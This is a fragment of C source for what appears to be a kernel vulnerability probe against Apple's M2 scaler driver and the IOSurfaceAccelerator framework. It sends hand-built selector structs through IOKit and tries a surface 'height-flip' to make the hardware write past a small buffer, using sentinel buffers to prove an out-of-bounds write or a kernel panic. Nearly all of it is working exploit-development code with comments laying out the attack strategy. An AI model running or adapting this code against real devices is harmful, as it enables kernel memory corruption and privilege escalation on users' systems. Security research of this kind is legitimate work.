            pfx, tag, note, w2c, w28, (unsigned long long)flags, dw, dh, dw, realDH);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef s = NULL, d = NULL;
    long fb = -1, lb = -1, db = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn c2 = ds_m2_make_pb(dw, realDH, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (c1 || c2 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fillv(s, tag, 0x42);
    ds_m2_fillv(d, tag, 0x41);
    void *kk = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    ds_m2_pStruct pS = kk ? (ds_m2_pStruct)dlsym(kk, "IOConnectCallStructMethod") : NULL;
    ds_m2_pMatch pM = kk ? (ds_m2_pMatch)dlsym(kk, "IOServiceMatching") : NULL;
    ds_m2_pGet1 pG1 = kk ? (ds_m2_pGet1)dlsym(kk, "IOServiceGetMatchingService") : NULL;
    ds_m2_pOpen pO = kk ? (ds_m2_pOpen)dlsym(kk, "IOServiceOpen") : NULL;
    ds_m2_pClose pC = kk ? (ds_m2_pClose)dlsym(kk, "IOServiceClose") : NULL;
    ds_m2_pRelease pR = kk ? (ds_m2_pRelease)dlsym(kk, "IOObjectRelease") : NULL;
    if (!pS || !pM || !pG1 || !pO) {
        dprintf(STDOUT_FILENO, "%s  I[%s] IOKit load FAIL\n", pfx, tag);
        CVBufferRelease(s); CVBufferRelease(d);
        ds_journal_write("DONE", "M2 dlsym-fail"); return;
    }
    CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
    ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
    ds_m2_io_obj_t conn = MACH_PORT_NULL;
    if (!svc || pO(svc, mach_task_self(), 0, &conn) != 0 || conn == MACH_PORT_NULL) {
        dprintf(STDOUT_FILENO, "%s  I[%s] open FAILED\n", pfx, tag);
        if (svc) pR(svc);
        CVBufferRelease(s); CVBufferRelease(d);
        ds_journal_write("DONE", "M2 open-fail"); return;
    }
    static uint8_t stb[0x1b0];
    uint32_t sid = IOSurfaceGetID(CVPixelBufferGetIOSurface(s));
    uint32_t did = IOSurfaceGetID(CVPixelBufferGetIOSurface(d));
    sig = ds_ave_guard_run_tmo(^int {
        memset(stb, 0, sizeof(stb));
        *(uint32_t *)(stb + 0x00) = sid; *(uint32_t *)(stb + 0x04) = did;
        *(uint64_t *)(stb + 0x20) = flags;
        *(uint32_t *)(stb + 0x28) = w28;
        *(uint32_t *)(stb + 0x2c) = w2c;
        *(uint32_t *)(stb + 0x48) = 1920; *(uint32_t *)(stb + 0x4c) = 1080;
        *(uint32_t *)(stb + 0x70) = (uint32_t)dw; *(uint32_t *)(stb + 0x74) = (uint32_t)dh;
        kr = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
        return 0;
    }, &rc, 8000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (8s) = HW GRINDING\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] sel1 kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    if (sig == 0 && kr == 0) {
        usleep(1500000);
        db = ds_m2_diff_pb(d, "dst", pfx, &fb, &lb);
        if (db > 0)
            dprintf(STDOUT_FILENO, "%s  I[%s] *** EXECUTED (dst %ld bytes changed first=%ld) + corruption geometry = THE 64747 SHOT ***\n", pfx, tag, db, fb);
        else
            dprintf(STDOUT_FILENO, "%s  I[%s] accepted but dst UNCHANGED (queued no-op at this mode)\n", pfx, tag);
    }
    CVBufferRelease(s);
    CVBufferRelease(d);
    pC(conn);
    pR(svc);
    ds_journal_write("DONE", stag);
}

/* X7: separate src/dst formats through the EXECUTING wrapper path */
static void ds_m2_xfmt_cell(const char *pfx, const char *tag, const char *note,
                            OSType sfmt, const char *sfn, OSType dfmt, const char *dfn,
                            int sw, int sh, int dw, int dh)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s | src=%dx%d %s dst=%dx%d %s\n", pfx, tag, note, sw, sh, sfn, dw, dh, dfn);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef s = NULL, d = NULL;
    long fb = -1, lb = -1, db = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(sw, sh, sfmt, &s);
    CVReturn c2 = ds_m2_make_pb(dw, dh, dfmt, &d);
    if (c1 || c2 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED (src=%d dst=%d)\n", pfx, tag, c1, c2);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fillv(s, tag, 0x42);
    ds_m2_fillv(d, tag, 0x41);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s), dIos = CVPixelBufferGetIOSurface(d);
    sig = ds_ave_guard_run_tmo(^int {
        kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, NULL);
        return 0;
    }, &rc, 8000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    if (sig == 0 && kr == 0) {
        usleep(1500000);
        db = ds_m2_diff_pb(d, "dst", pfx, &fb, &lb);
        dprintf(STDOUT_FILENO, "%s  I[%s] %s (%ld bytes)\n", pfx, tag,
                db > 0 ? "*** EXECUTED ***" : "accepted-noop", db);
    }
    CVBufferRelease(s);
    CVBufferRelease(d);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* v171 - THE RECT-GEOMETRY ROUND (100% R/W-proven cells): the option  */
/* block carries a 4-short rect at +0xcc..+0xd2 (the BorderFill rect:  */
/* X/Y/Width/Height, flag 0x2000000000000 = all-four-present). If the  */
/* HW's EFFECTIVE dest geometry comes from the rect while the gate     */
/* reads the surface dims, a 1080p dst (gate passes) with a 32-high    */
/* rect = the bug geometry BEHIND the gate. Every cell = a full R/W    */
/* witness: src fill 0x42, dst+sentinels fill 0x41, delayed diff.      */
/* ------------------------------------------------------------------ */
static void ds_m2_rw_cell(const char *pfx, const char *tag, const char *note, int mode,
                          int bfX, int bfY, int bfW, int bfH, uint64_t rawFlags)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s | mode=%d rect={%d,%d,%d,%d} rawFlags=%llx\n",
            pfx, tag, note, mode, bfX, bfY, bfW, bfH, (unsigned long long)rawFlags);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef sa = NULL, sb = NULL, sc = NULL, src = NULL;
    long fa = 0, la = 0, fb = 0, lb = 0, fc = 0, lc = 0;
    long da = 0, db = 0, dc = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
    CVReturn c2 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sb);
    CVReturn c3 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    CVReturn c4 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &src);
    if (c1 || c2 || c3 || c4 || !sa || !sb || !sc || !src) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (sa) CVBufferRelease(sa); if (sb) CVBufferRelease(sb);
        if (sc) CVBufferRelease(sc); if (src) CVBufferRelease(src);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fill(sa, tag); ds_m2_fill(sb, tag); ds_m2_fill(sc, tag); ds_m2_fillv(src, tag, 0x42);
    /* the options dict (mode 1): the BorderFill rect via the dlsym'd keys */
    CFMutableDictionaryRef opts = NULL;
    if (mode == 1) {
        opts = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        const char *keys[4] = { "kIOSurfaceAcceleratorBorderFillX", "kIOSurfaceAcceleratorBorderFillY",
                                "kIOSurfaceAcceleratorBorderFillWidth", "kIOSurfaceAcceleratorBorderFillHeight" };
        int vals[4] = { bfX, bfY, bfW, bfH };
        int nkeys = 0;
        for (int i = 0; i < 4; i++) {
            CFStringRef ks = ds_m2_cfstr(keys[i]);
            CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vals[i]);
            if (ks && nv) { CFDictionarySetValue(opts, ks, nv); nkeys++; }
            if (nv) CFRelease(nv);
        }
        dprintf(STDOUT_FILENO, "  I[%s] opts=%p keys=%d/4\n", tag, (void *)opts, nkeys);
    }
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(src), dIos = CVPixelBufferGetIOSurface(sb);
    if (mode == 2) {
        /* the raw sel1 struct: honest dims (the gate passes) + the rect shorts */
        void *kk = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        ds_m2_pStruct pS = kk ? (ds_m2_pStruct)dlsym(kk, "IOConnectCallStructMethod") : NULL;
        ds_m2_pMatch pM = kk ? (ds_m2_pMatch)dlsym(kk, "IOServiceMatching") : NULL;
        ds_m2_pGet1 pG1 = kk ? (ds_m2_pGet1)dlsym(kk, "IOServiceGetMatchingService") : NULL;
        ds_m2_pOpen pO = kk ? (ds_m2_pOpen)dlsym(kk, "IOServiceOpen") : NULL;
        ds_m2_pClose pC = kk ? (ds_m2_pClose)dlsym(kk, "IOServiceClose") : NULL;
        ds_m2_pRelease pR = kk ? (ds_m2_pRelease)dlsym(kk, "IOObjectRelease") : NULL;
        if (!pS || !pM || !pG1 || !pO) { kr = -777; goto submit; }
        CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
        ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
        ds_m2_io_obj_t conn = MACH_PORT_NULL;
        if (!svc || pO(svc, mach_task_self(), 0, &conn) != 0 || conn == MACH_PORT_NULL) {
            if (svc) pR(svc);
            kr = -778; goto submit;
        }
        static uint8_t stb[0x1b0];
        uint32_t sid = IOSurfaceGetID(sIos), did = IOSurfaceGetID(dIos);
        sig = ds_ave_guard_run_tmo(^int {
            memset(stb, 0, sizeof(stb));
            *(uint32_t *)(stb + 0x00) = sid; *(uint32_t *)(stb + 0x04) = did;
            *(uint64_t *)(stb + 0x20) = rawFlags;
            *(uint32_t *)(stb + 0x2c) = 1;
            *(uint32_t *)(stb + 0x48) = 1920; *(uint32_t *)(stb + 0x4c) = 1080;
            *(uint32_t *)(stb + 0x70) = 1920; *(uint32_t *)(stb + 0x74) = 1080;
            *(int16_t *)(stb + 0xcc) = (int16_t)bfX;
            *(int16_t *)(stb + 0xce) = (int16_t)bfY;
            *(int16_t *)(stb + 0xd0) = (int16_t)bfW;
            *(int16_t *)(stb + 0xd2) = (int16_t)bfH;
            kr = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
            return 0;
        }, &rc, 8000);
        pC(conn);
        if (svc) pR(svc);
    } else {
        sig = ds_ave_guard_run_tmo(^int {
            kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, (CFDictionaryRef)opts);
            return 0;
        }, &rc, 8000);
    }
submit:
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (8s) = HW GRINDING\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] submit kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    usleep(1500000);
    da = ds_m2_diff_pb(sa, "A(pre)", pfx, &fa, &la);
    db = ds_m2_diff_pb(sb, "B(dst)", pfx, &fb, &lb);
    dc = ds_m2_diff_pb(sc, "C(post)", pfx, &fc, &lc);
    if (da > 0 || dc > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] *** OOB WRITE PROVEN (A=%ld C=%ld) = THE 64747 WRITE SURFACE ***\n", pfx, tag, da, dc);
    else if (db > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] EXECUTED (dst %ld bytes, first=%ld) - the rect rode the HW\n", pfx, tag, db, fb);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] no execution witness (kr=%s)\n", pfx, tag, ds_m2_kr(kr));
    if (opts) CFRelease(opts);
    CVBufferRelease(sa); CVBufferRelease(sb); CVBufferRelease(sc); CVBufferRelease(src);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* v172 - THE SHAPE + THE HEIGHT-FLIP (100% R/W at every step):        */
/*  S0 = the K2 write-shape oracle: raw sel1 struct dst=1920x32 into a */
/*  REAL 1080p dst - the B-diff SHAPE (which rows changed) proves what */
/*  the HW programs from (struct dims vs surface dims).                */
/*  S1 = THE HEIGHT-FLIP: create a legal 1920x32 surface (small alloc),*/
/*  IOSurfaceSetValue(kIOSurfaceHeight, 1080) - if the surface now     */
/*  REPORTS 1080 (gate passes) while the backing alloc stays 32 rows,  */
/*  the transfer writes 1080 rows into a 32-row buffer = the OOB.      */
/* ------------------------------------------------------------------ */

/* the write-shape oracle: how many ROWS of the dst did the HW write? */
static void ds_m2_shape_cell(const char *pfx, const char *tag, const char *note,
                             int sdw, int sdh, int realDH)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s | struct-dst=%dx%d REAL-dst=1920x%d\n", pfx, tag, note, sdw, sdh, realDH);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CVPixelBufferRef s = NULL, d = NULL;
    long fb = 0, lb = 0, db = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn c2 = ds_m2_make_pb(1920, realDH, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (c1 || c2 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fillv(s, tag, 0x42);
    ds_m2_fillv(d, tag, 0x41);
    void *kk = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    ds_m2_pStruct pS = kk ? (ds_m2_pStruct)dlsym(kk, "IOConnectCallStructMethod") : NULL;
    ds_m2_pMatch pM = kk ? (ds_m2_pMatch)dlsym(kk, "IOServiceMatching") : NULL;
    ds_m2_pGet1 pG1 = kk ? (ds_m2_pGet1)dlsym(kk, "IOServiceGetMatchingService") : NULL;
    ds_m2_pOpen pO = kk ? (ds_m2_pOpen)dlsym(kk, "IOServiceOpen") : NULL;
    ds_m2_pClose pC = kk ? (ds_m2_pClose)dlsym(kk, "IOServiceClose") : NULL;
    ds_m2_pRelease pR = kk ? (ds_m2_pRelease)dlsym(kk, "IOObjectRelease") : NULL;
    if (!pS || !pM || !pG1 || !pO) {
        dprintf(STDOUT_FILENO, "%s  I[%s] IOKit FAIL\n", pfx, tag);
        CVBufferRelease(s); CVBufferRelease(d);
        ds_journal_write("DONE", "M2 dlsym-fail"); return;
    }
    CFMutableDictionaryRef m = pM("AppleM2ScalerCSCDriver");
    ds_m2_io_obj_t svc = m ? pG1(0, m) : MACH_PORT_NULL;
    ds_m2_io_obj_t conn = MACH_PORT_NULL;
    if (!svc || pO(svc, mach_task_self(), 0, &conn) != 0 || conn == MACH_PORT_NULL) {
        dprintf(STDOUT_FILENO, "%s  I[%s] open FAILED\n", pfx, tag);
        if (svc) pR(svc);
        CVBufferRelease(s); CVBufferRelease(d);
        ds_journal_write("DONE", "M2 open-fail"); return;
    }
    static uint8_t stb[0x1b0];
    uint32_t sid = IOSurfaceGetID(CVPixelBufferGetIOSurface(s));
    uint32_t did = IOSurfaceGetID(CVPixelBufferGetIOSurface(d));
    sig = ds_ave_guard_run_tmo(^int {
        memset(stb, 0, sizeof(stb));
        *(uint32_t *)(stb + 0x00) = sid; *(uint32_t *)(stb + 0x04) = did;
        *(uint64_t *)(stb + 0x20) = 0x2000;
        *(uint32_t *)(stb + 0x2c) = 1;
        *(uint32_t *)(stb + 0x48) = 1920; *(uint32_t *)(stb + 0x4c) = 1080;
        *(uint32_t *)(stb + 0x70) = (uint32_t)sdw; *(uint32_t *)(stb + 0x74) = (uint32_t)sdh;
        kr = pS(conn, 1, stb, sizeof(stb), NULL, NULL);
        return 0;
    }, &rc, 8000);
    pC(conn);
    if (svc) pR(svc);
    dprintf(STDOUT_FILENO, "%s  I[%s] sel1 kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
    if (sig == 0 && kr == 0) {
        usleep(1500000);
        db = ds_m2_diff_pb(d, "dst", pfx, &fb, &lb);
        if (db > 0) {
            long rows = lb / 1920;
            dprintf(STDOUT_FILENO, "%s  I[%s] SHAPE: %ld bytes, rows~%ld (struct-fed = rows~%d, real-fed = rows~%d)\n",
                    pfx, tag, db, rows, sdh, realDH);
            if (db < (long)(sdh < realDH ? sdh : realDH) * 1920)
                dprintf(STDOUT_FILENO, "%s  I[%s] *** STRUCT-FED CONFIRMED - the HW programs the declared dims ***\n", pfx, tag);
            else if (db >= (long)realDH * 1920)
                dprintf(STDOUT_FILENO, "%s  I[%s] *** REAL-FED (the HW writes the full real surface) ***\n", pfx, tag);
        } else {
            dprintf(STDOUT_FILENO, "%s  I[%s] accepted but NO write (queued no-op at this shape)\n", pfx, tag);
        }
    }
    CVBufferRelease(s);
    CVBufferRelease(d);
    ds_journal_write("DONE", stag);
}

/* the height-flip: legal 32-row alloc, mutated to REPORT 1080 */
static void ds_m2_flip_cell(const char *pfx, const char *tag, int newH)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] HEIGHT-FLIP: create 1920x32 (small alloc) -> IOSurfaceSetValue(kIOSurfaceHeight,%d) -> transfer 1080p->it\n", pfx, tag, newH);
    if (ds_m2_ensure_acc(pfx, tag) != 0) { ds_journal_write("DONE", "M2 no-acc"); return; }
    CFStringRef kH = ds_m2_cfstr("kIOSurfaceHeight");
    dprintf(STDOUT_FILENO, "  I[%s] kIOSurfaceHeight=%p\n", tag, (void *)kH);
    CVPixelBufferRef s = NULL, d = NULL;
    CVPixelBufferRef sa = NULL, sc = NULL;
    long fa = 0, la = 0, fb = 0, lb = 0, fc = 0, lc = 0;
    long da = 0, db = 0, dc = 0;
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    CVReturn c1 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn c2 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    CVReturn c3 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
    CVReturn c4 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    if (c1 || c2 || c3 || c4 || !s || !d || !sa || !sc) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surfaces FAILED\n", pfx, tag);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        if (sa) CVBufferRelease(sa); if (sc) CVBufferRelease(sc);
        ds_journal_write("DONE", "M2 pb-fail"); return;
    }
    ds_m2_fillv(s, tag, 0x42);
    ds_m2_fill(d, tag); ds_m2_fill(sa, tag); ds_m2_fill(sc, tag);
    IOSurfaceRef dIos = CVPixelBufferGetIOSurface(d);
    uint32_t h0 = IOSurfaceGetHeight(dIos);
    /* THE FLIP (the header says SetValue cannot change surface properties -
     * the readback proves it either way: the last R/W axis) */
    int setRc = -1;
    if (kH) {
        CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &newH);
        if (nv) { IOSurfaceSetValue(dIos, kH, (CFTypeRef)nv); CFRelease(nv); setRc = 0; }
    }
    uint32_t h1 = IOSurfaceGetHeight(dIos);
    dprintf(STDOUT_FILENO, "  I[%s] FLIP: H %u -> %u (set=%d) %s\n", tag, h0, h1, setRc,
            (h0 == 32 && h1 == (uint32_t)newH) ? "*** FLIP TOOK - the surface reports the new H with the old alloc ***" : "(no flip - H immutable)");
    if (h0 == 32 && h1 == (uint32_t)newH) {
        IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s);
        sig = ds_ave_guard_run_tmo(^int {
            kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, NULL);
            return 0;
        }, &rc, 8000);
        dprintf(STDOUT_FILENO, "%s  I[%s] xfer kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
        usleep(1500000);
        da = ds_m2_diff_pb(sa, "A(pre)", pfx, &fa, &la);
        db = ds_m2_diff_pb(d, "B(dst)", pfx, &fb, &lb);
        dc = ds_m2_diff_pb(sc, "C(post)", pfx, &fc, &lc);
        if (da > 0 || dc > 0)
            dprintf(STDOUT_FILENO, "%s  I[%s] *** OOB WRITE PROVEN (A=%ld C=%ld) = THE 64747 WRITE ***\n", pfx, tag, da, dc);
        else if (db > 0)
            dprintf(STDOUT_FILENO, "%s  I[%s] EXECUTED (dst %ld bytes first=%ld last=%ld rows~%ld) - the HW wrote past the 32-row alloc? check A/C\n", pfx, tag, db, fb, lb, lb / 1920);
        else
            dprintf(STDOUT_FILENO, "%s  I[%s] no write (kr=%s)\n", pfx, tag, ds_m2_kr(kr));
    }
    CVBufferRelease(s); CVBufferRelease(d); CVBufferRelease(sa); CVBufferRelease(sc);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
void probe_m2scaler(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== I. M2SCALER-CSC T1 (v172 - THE SHAPE + THE HEIGHT-FLIP, 100%% R/W) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  v171 verdict: the BorderFill rect is FILL geometry - M2R1-R4 all EXECUTED the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  FULL 1080p dst (3110400 bytes, A/C=0) at every rect height (32/16/bottom-edge);", pfx);
    dprintf(STDOUT_FILENO, "%s  the rect does NOT become the effective dest; M2R5's 0x10000000 bit = an\n", pfx);
    dprintf(STDOUT_FILENO, "%s  unsupported path. THE TWO REMAINING R/W-PROVABLE VECTORS: (1) M2S0 = the K2\n", pfx);
    dprintf(STDOUT_FILENO, "%s  WRITE-SHAPE oracle - struct dst=1920x32 into a REAL 1080p dst, the diff shape\n", pfx);
    dprintf(STDOUT_FILENO, "%s  proves what the HW programs from (struct dims = 32 rows vs real = 1080 rows);\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (2) M2S1/S2 = THE HEIGHT-FLIP: a legal 1920x32 IOSurface (small alloc),\n", pfx);
    dprintf(STDOUT_FILENO, "%s  IOSurfaceSetValue(kIOSurfaceHeight, 1080/2048) - if the surface REPORTS the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  new H while the backing alloc stays 32 rows, the gate PASSES on the reported\n", pfx);
    dprintf(STDOUT_FILENO, "%s  dims and the HW writes the new-H rows into the 32-row alloc = the OOB, with\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sentinels A/C on both sides. Every verdict = readback. A PANIC = THE 64747.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  v171 verdict: the BorderFill rect is FILL geometry (M2R1-R4 EXECUTED the FULL\n", pfx);
    dprintf(STDOUT_FILENO, "%s  1080p dst at every rect height; A/C=0). destH<=32+srcW>128+planes>1 stays gated on\n", pfx);
    dprintf(STDOUT_FILENO, "%s  every mode/format/flag. PULL THE KERNEL LOG: grep IOSA.\n", pfx);
    /* load the real client framework (falls back to the IOSurface lib) */
    ds_m2_hIA = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    ds_m2_hIS = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *h1 = ds_m2_hIA ? ds_m2_hIA : ds_m2_hIS;
    dprintf(STDOUT_FILENO, "%s  I[load] IOSurfaceAccelerator fw=%p IOSurface=%p\n", pfx, ds_m2_hIA, ds_m2_hIS);
    ds_m2_pcreate = (ds_m2_pCreate)dlsym(h1, "IOSurfaceAcceleratorCreate");
    ds_m2_pgetid  = (ds_m2_pGetID)dlsym(h1, "IOSurfaceAcceleratorGetID");
    ds_m2_pxfer   = (ds_m2_pXfer)dlsym(h1, "IOSurfaceAcceleratorTransferSurface");
    ds_m2_pswap   = (ds_m2_pXfer8)dlsym(h1, "IOSurfaceAcceleratorTransferSurfaceWithSwap");
    ds_m2_pxform  = (ds_m2_pXfer8)dlsym(h1, "IOSurfaceAcceleratorTransformSurface");
    ds_m2_pblit   = (ds_m2_pXfer8)dlsym(h1, "IOSurfaceAcceleratorBlitSurface");
    ds_m2_pcond   = (ds_m2_pXfer8)dlsym(h1, "IOSurfaceAcceleratorConditionalTransferSurfaceWithSwap");
    ds_m2_pest    = (ds_m2_pEst)dlsym(h1, "IOSurfaceAcceleratorGetTransformEstimation");
    ds_m2_pbind   = (ds_m2_pBind)dlsym(ds_m2_hIS, "IOSurfaceBindAccel");
    ds_m2_pneeds  = (ds_m2_pNeedsBind)dlsym(ds_m2_hIS, "IOSurfaceNeedsBindAccel");
    ds_m2_pdiag   = (ds_m2_pDiag)dlsym(h1, "IOSurfaceAcceleratorGetDiag");
    ds_m2_pkt     = (ds_m2_pKT)dlsym(h1, "IOSurfaceAcceleratorKernelTests");
    ds_m2_pabort  = (ds_m2_pAbort)dlsym(h1, "IOSurfaceAcceleratorAbortTransfers");
    dprintf(STDOUT_FILENO, "%s  I[load] create=%p xfer=%p swap=%p xform=%p blit=%p cond=%p est=%p bind=%p needs=%p diag=%p ktests=%p\n", pfx,
            (void *)ds_m2_pcreate, (void *)ds_m2_pxfer, (void *)ds_m2_pswap, (void *)ds_m2_pxform,
            (void *)ds_m2_pblit, (void *)ds_m2_pcond, (void *)ds_m2_pest,
            (void *)ds_m2_pbind, (void *)ds_m2_pneeds, (void *)ds_m2_pdiag, (void *)ds_m2_pkt);
    if (!ds_m2_pcreate || !ds_m2_pxfer) {
        dprintf(STDOUT_FILENO, "%s  I[load] missing core syms - row void\n", pfx);
        return;
    }

    /* the layer discriminator first */
    ds_m2_direct_cell(pfx, "M2E1", "Estimation SAME-SIZE 1080p->1080p (userspace-only probe)", 6, 1920, 1080, 1920, 1080, 0);
    ds_m2_direct_cell(pfx, "M2E2", "Estimation 1080p->h32 (the corruption geometry, userspace-only)", 6, 1920, 1080, 1920, 32, 0);
    /* the transfer matrix */
    ds_m2_direct_cell(pfx, "M2D1", "Xfer SAME-SIZE control (kext blit arm)", 0, 1920, 1080, 1920, 1080, 0);
    ds_m2_direct_cell(pfx, "M2D2", "Xfer 1080p->h32 = THE CORRUPTION CONFIG (destH<=32 + srcW>128 + planes>1)", 0, 1920, 1080, 1920, 32, 0);
    ds_m2_direct_cell(pfx, "M2H1", "Xfer 64x64->64x64 tiny (the geometry floor probe)", 0, 64, 64, 64, 64, 0);
    /* the new arms */
    ds_m2_bind_cell(pfx);
    ds_m2_diag_cell(pfx);
    ds_m2_ktests_cell(pfx);
    ds_m2_raw_cell(pfx);
    ds_m2_direct_cell(pfx, "M2D8", "Xfer 1080p->h32 + opts{ForceMaxSpeed,LockInScaler,UseNearestFilter} (v166: deref-fixed)", 5, 1920, 1080, 1920, 32, 1);
    /* THE RECT-GEOMETRY ROUND (every cell R/W-witnessed) */
    /* THE SHAPE + THE HEIGHT-FLIP (all R/W-witnessed) */
    ds_m2_shape_cell(pfx, "M2S0", "THE SHAPE ORACLE: struct dst=1920x32 into a REAL 1080p dst (K2, witnessed)", 1920, 32, 1080);
    ds_m2_shape_cell(pfx, "M2S0b", "SHAPE control: struct dst=1920x1080 real 1080p (must write ALL rows)", 1920, 1080, 1080);
    ds_m2_flip_cell(pfx, "M2S1", 1080);
    ds_m2_flip_cell(pfx, "M2S2", 2048);
    ds_m2_selmap(pfx);
    ds_m2_canary(pfx);
    ds_m2_canary(pfx);

